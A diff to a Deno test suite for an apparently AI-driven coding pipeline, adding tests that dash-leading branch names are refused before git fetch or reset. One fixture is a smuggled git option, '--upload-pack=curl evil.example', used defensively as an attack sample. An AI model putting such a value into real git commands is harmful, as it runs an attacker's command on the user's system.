@@ -11,12 +11,13 @@
  * Uses Australian English throughout (behaviour, colour, etc.).
  */
 
-import { assertEquals, assertStringIncludes } from "@std/assert";
+import { assert, assertEquals, assertStringIncludes } from "@std/assert";
 import {
   attemptPrSelfHealing,
   buildDiagnosticContext,
   buildFailureMessage,
   buildOutOfMemoryMessage,
+  createDefaultDeps,
   detectScreenshotRequired,
   type ExecuteClaudePhaseDeps,
   type ExecuteClaudePhaseOptions,
@@ -575,10 +576,12 @@ Deno.test("runExecuteClaudePhase - no changes triggers self-healing for existing
 });
 
 Deno.test("runExecuteClaudePhase - no changes with remote commits triggers remote self-healing", async () => {
+  const gitCalls: string[][] = [];
   const result = await runExecuteClaudePhase(
     createTestOptions(),
     createMockDeps({
       runGitCommand: async (args: string[]) => {
+        gitCalls.push(args);
         if (args[0] === "status") return { ok: true, value: "" };
         if (args[0] === "log" && args[1] === "main..issue-42-fix-the-bug") {
           return { ok: true, value: "" }; // No local commits
@@ -594,6 +597,66 @@ Deno.test("runExecuteClaudePhase - no changes with remote commits triggers remot
   );
   assertEquals(result.action, "remote_self_healed");
   assertEquals(result.hasNewCommits, true);
+  // Issue #268: fetch/reset must go through git_ref_args.ts so a dash-leading
+  // branch name cannot be parsed as a git option.
+  assertEquals(
+    gitCalls.find((args) => args[0] === "fetch"),
+    ["fetch", "--end-of-options", "origin", "issue-42-fix-the-bug"],
+  );
+  assertEquals(
+    gitCalls.find((args) => args[0] === "reset"),
+    ["reset", "--hard", "--end-of-options", "origin/issue-42-fix-the-bug"],
+  );
+});
+
+const DASH_LEADING_BRANCH = "--upload-pack=curl evil.example";
+
+Deno.test("runExecuteClaudePhase - dash-leading branch is refused before git fetch (Issue #268)", async () => {
+  const gitCalls: string[][] = [];
+  const result = await runExecuteClaudePhase(
+    createTestOptions({ branchName: DASH_LEADING_BRANCH }),
+    createMockDeps({
+      runGitCommand: async (args: string[]) => {
+        gitCalls.push(args);
+        if (args[0] === "status") return { ok: true, value: "" };
+        if (args[0] === "log") return { ok: true, value: "" };
+        return { ok: true, value: "" };
+      },
+    }),
+  );
+
+  assertEquals(result.action, "failure");
+  assertEquals(result.failureType, "execution_error");
+  assertStringIncludes(result.failureMessage ?? "", "must not begin with '-'");
+
+  for (const args of gitCalls) {
+    assert(
+      args[0] !== "fetch" && args[0] !== "reset",
+      `dash-leading branch must not reach git fetch/reset (got ${
+        JSON.stringify(args)
+      })`,
+    );
+    assertEquals(
+      args.includes(DASH_LEADING_BRANCH),
+      false,
+      `dash-leading branch must not be passed to git (got ${
+        JSON.stringify(args)
+      })`,
+    );
+  }
+});
+
+Deno.test("createDefaultDeps - git runner reports checked-runner failures (Issue #268)", async () => {
+  const deps = createDefaultDeps();
+  const result = await deps.runGitCommand([
+    "not-a-real-git-subcommand-issue-268",
+  ]);
+  assertEquals(result.ok, false);
+  if (!result.ok) {
+    // git_timeout.runGitCommandChecked wraps the exit: the inline Deno.Command
+    // runner only forwarded raw stderr, so this pins the journalled path.
+    assertStringIncludes(result.error.message, "failed (exit code");
+  }
 });
 
 Deno.test("runExecuteClaudePhase - no changes and no remote commits returns no_changes", async () => {
